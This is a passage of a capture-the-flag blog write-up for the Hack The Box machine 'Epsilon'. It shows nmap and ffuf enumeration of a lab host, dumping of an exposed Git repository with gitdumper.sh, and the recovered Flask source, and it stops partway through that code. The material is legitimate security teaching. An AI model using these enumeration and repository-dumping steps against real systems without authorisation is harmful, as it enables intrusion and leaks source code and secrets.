<!doctype html><html lang="en"><head><title>Epsilon | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine"><meta name="image" content="https://7rocky.github.io/images/HTB/Epsilon/Epsilon.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine"><meta itemprop="keywords" content="git,cronjob,symlinks,jwt,static-code-analysis,aws,rce,ssti,"><meta itemprop="name" content="Epsilon"><meta property="article:published_time" content="2022-02-07T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Epsilon/Epsilon.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Epsilon"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/epsilon/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine contains a website that exposes Git repository with secrets in old commits. There is a website that needs a valid JWT token in order to exploit an SSTI vulnerability. The secret for the JWT tokens is stored in an AWS Lambda function. Then, there is a Cron job that can be exploited using symlinks to gain arbitrary read. Knowledge about Git, JWT, SSTI and AWS Lambda, as well as Cron job exploitation, is needed to compromise this machine"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Epsilon/Epsilon.webp"><meta name="twitter:title" content="Epsilon"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/epsilon/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/epsilon/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/epsilon/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/epsilon/&amp;text=Epsilon" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/epsilon/&amp;title=Epsilon" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Epsilon</h1><time class="mt4 f6 dib tracked" datetime="2022-02-07T00:00:00+01:00">07 / 02 / 2022</time><br><p class="mb4 f6 dib tracked">10 minutes to read</p></header><div class="htb-image"><img alt="Epsilon" src="/images/HTB/Epsilon/Epsilon.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/symlinks" title="Symbolic links">Symbolic links</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/jwt" title="JSON Web Token">JSON Web Token</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/aws" title="Amazon Web Services">Amazon Web Services</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/ssti" title="Server-Side Template Injection">Server-Side Template Injection</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#git-repository-enumeration">Git repository enumeration</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.134</li><li><strong>Release</strong>: 07 / 02 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.134 -p 22,80,5000
Nmap scan report for 10.10.11.134
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-git:
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 8.86 seconds
</code></pre></div><p>This machine has ports 22 (SSH), 80 (HTTP) and 5000 (HTTP) open.</p><h2 id="web-enumeration">Web enumeration</h2><p>There is a website on port 5000. It looks like this:</p><p><img alt="Epsilon login" src="/images/HTB/Epsilon/Epsilon-login.webp"></p><p>We can enumerate more routes but we cannot access them because we do not have valid credentials yet:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.134:5000/FUZZ  
<span class="code-dark-blue">home                    [Status: 302, Size: 208, Words: 21, Lines: 4]</span>
<span class="code-dark-blue">order                   [Status: 302, Size: 208, Words: 21, Lines: 4]</span>
<span class="code-dark-green">track                   [Status: 200, Size: 4288, Words: 631, Lines: 234]</span>
<span class="code-dark-green">                        [Status: 200, Size: 3550, Words: 522, Lines: 205]</span>
</code></pre></div><h2 id="git-repository-enumeration">Git repository enumeration</h2><p>The output of <code>nmap</code> unveiled that there is a Git repository exposed on port 80.</p><p>We may use some tool like <code>git-dumper</code>, but this time I used <code>gitdumper.sh</code> from <a target="_blank" href="https://github.com/internetwache/GitTools">GitTools</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> gitdumper.sh http://10.10.11.134/.git/ ./epsilon_git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.  
# Only for educational purposes!
###########


<span class="code-dark-yellow">[*] Destination folder does not exist</span>
<span class="code-dark-green">[+] Creating ./epsilon/.git/</span>
<span class="code-dark-green">[+] Downloaded: HEAD</span>
<span class="code-dark-red">[-] Downloaded: objects/info/packs</span>
<span class="code-dark-green">[+] Downloaded: description</span>
<span class="code-dark-green">[+] Downloaded: config</span>
<span class="code-dark-green">[+] Downloaded: COMMIT_EDITMSG</span>
<span class="code-dark-green">[+] Downloaded: index</span>
<span class="code-dark-red">[-] Downloaded: packed-refs</span>
<span class="code-dark-green">[+] Downloaded: refs/heads/master</span>
<span class="code-dark-red">[-] Downloaded: refs/remotes/origin/HEAD</span>
<span class="code-dark-red">[-] Downloaded: refs/stash</span>
<span class="code-dark-green">[+] Downloaded: logs/HEAD</span>
<span class="code-dark-green">[+] Downloaded: logs/refs/heads/master</span>
<span class="code-dark-red">[-] Downloaded: logs/refs/remotes/origin/HEAD</span>
<span class="code-dark-red">[-] Downloaded: info/refs</span>
<span class="code-dark-green">[+] Downloaded: info/exclude</span>
<span class="code-dark-red">[-] Downloaded: /refs/wip/index/refs/heads/master</span>
<span class="code-dark-red">[-] Downloaded: /refs/wip/wtree/refs/heads/master</span>
<span class="code-dark-green">[+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91</span>
<span class="code-dark-red">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span>
<span class="code-dark-green">[+] Downloaded: objects/7c/f92a7a09e523c1c667d13847c9ba22464412f3</span>
<span class="code-dark-green">[+] Downloaded: objects/c5/1441640fd25e9fba42725147595b5918eba0f1</span>
<span class="code-dark-green">[+] Downloaded: objects/b1/0dd06d56ac760efbbb5d254ea43bf9beb56d2d</span>
<span class="code-dark-green">[+] Downloaded: objects/ce/401ccecf421ff19bf43fafe8a60a0d0f0682d0</span>
<span class="code-dark-green">[+] Downloaded: objects/5c/52105750831385d4756111e1103957ac599d02</span>
<span class="code-dark-green">[+] Downloaded: objects/b5/f4c99c772eeb629e53d284275458d75ed9a010</span>
<span class="code-dark-green">[+] Downloaded: objects/ab/07f7cdc7f410b8c8f848ee5674ec550ecb61ca</span>
<span class="code-dark-green">[+] Downloaded: objects/cf/489a3776d2bf87ac32de4579e852a4dc116ce8</span>
<span class="code-dark-green">[+] Downloaded: objects/65/b80f62da28254f67f0bea392057fd7d2330e2d</span>
<span class="code-dark-green">[+] Downloaded: objects/df/dfa17ca5701b1dca5069b6c3f705a038f4361e</span>
<span class="code-dark-green">[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630</span>
<span class="code-dark-green">[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca</span>
<span class="code-dark-green">[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34</span>
</code></pre></div><p>Now we should have a <code>.git</code> directory inside <code>epsilon_git</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cd</span> epsilon_git

<span class="code-cyan">$</span> <span class="code-dark-green">ls</span> -a
<span class="code-blue">.</span>                       <span class="code-blue">..</span>                      <span class="code-blue">.git</span>  
</code></pre></div><p>At this point we can extract the current code of the main branch using:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> checkout .

<span class="code-cyan">$</span> <span class="code-dark-green">ls</span>
server.py               track_api_CR_148.py  
</code></pre></div><p>The file <code>server.py</code> contains a simple Flask application that corresponds to the website on port 5000:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/python3</span>

<span class="mtk5">import</span> <span class="mtk8 mtku">jwt</span>
<span class="mtk5">from</span> <span class="mtk8 mtku">flask</span> <span class="mtk5">import</span> <span class="mtk5">*</span>

<span class="mtk8 mtku">app</span> <span class="mtk5">=</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">(</span><span class="mtk1">__name__</span><span class="mtk1">)</span>
<span class="mtk1">secret</span> <span class="mtk5">=</span> <span class="mtk4">'&lt;secret_key&gt;'</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">verify_jwt</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">,</span> <span class="mtk9 mtki">key</span><span class="mtk1">):</span>
    <span class="mtk5">try</span><span class="mtk1">:</span>
        <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk8 mtku">jwt</span><span class="mtk1">.</span><span class="mtk1">decode</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">,</span> <span class="mtk9 mtki">key</span><span class="mtk1">,</span> <span class="mtk9 mtki">algorithms</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'HS256'</span><span class="mtk1">])[</span><span class="mtk4">'username'</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk1">username</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk6">True</span>
        <span class="mtk5">else</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk6">False</span>
    <span class="mtk5">except</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk6">False</span>


<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">,</span> <span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">,</span> <span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">index</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span> <span class="mtk5">==</span> <span class="mtk4">'POST'</span><span class="mtk1">:</span>
        <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk4">'admin'</span> <span class="mtk5">and</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'password'</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk4">'admin'</span><span class="mtk1">:</span>  
            <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk8">make_response</span><span class="mtk1">()</span>
            <span class="mtk1 squiggly-inline-unnecessary">username</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">]</span>
            <span class="mtk1">token</span> <span class="mtk5">=</span> <span class="mtk8 mtku">jwt</span><span class="mtk1">.</span><span class="mtk1">encode</span><span class="mtk1">({</span><span class="mtk4">'username'</span><span class="mtk1">:</span> <span class="mtk4">'admin'</span><span class="mtk1">}, secret</span><span class="mtk1">,</span> <span class="mtk9 mtki">algorithm</span><span class="mtk5">=</span><span class="mtk4">'HS256'</span><span class="mtk1">)</span>
            <span class="mtk1">res</span><span class="mtk1">.</span><span class="mtk8">set_cookie</span><span class="mtk1">(</span><span class="mtk4">'auth'</span><span class="mtk1">,</span> <span class="mtk1">token</span><span class="mtk1">)</span>
            <span class="mtk1">res</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1">[</span><span class="mtk4">'location'</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk4">'/home'</span>
            <span class="mtk5">return</span> <span class="mtk1">res</span><span class="mtk1">,</span> <span class="mtk6">302</span>
        <span class="mtk5">else</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'index.html'</span><span class="mtk1">)</span>
    <span class="mtk5">else</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'index.html'</span><span class="mtk1">)</span>


<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/home'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">home</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">verify_jwt</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'auth'</span><span class="mtk1">),</span> <span class="mtk1">secret</span><span class="mtk1">):</span>
        <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'home.html'</span><span class="mtk1">)</span>
    <span class="mtk5">else</span><span class="mtk1">:</span>
        <span class="mtk5">return</span> <span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">,</span> <span class="mtk9 mtki">code</span><span class="mtk5">=</span><span class="mtk6">302</span><span class="mtk1">)</span>


<span class="mtk8">@</span><span class="mtk8 mtku">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/track'</span><span class="mtk1">,</span> <span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">,</span> <span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">track</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span> <span class="mtk5">==</span> <span class="mtk4">'POST'</span><span class="mtk1">:</span>
        <span class="mtk5">if</span> <span class="mtk8">verify_jwt</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">cookies</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'auth'</span><span class="mtk1">),</span> <span class="mtk1">secret</span><span class="mtk1">):</span>
            <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'track.html'</span><span class="mtk1">,</span> <span class="mtk9 mtki">message</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
        <span class="mtk5">else</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">,</span> <span class="mtk9 mtki">code</span><span class="mtk5">=</span><span class="mtk6">302</span><span class="mtk1">)</span>
    <span class="mtk5">else</span><span class="mtk1">:</span>
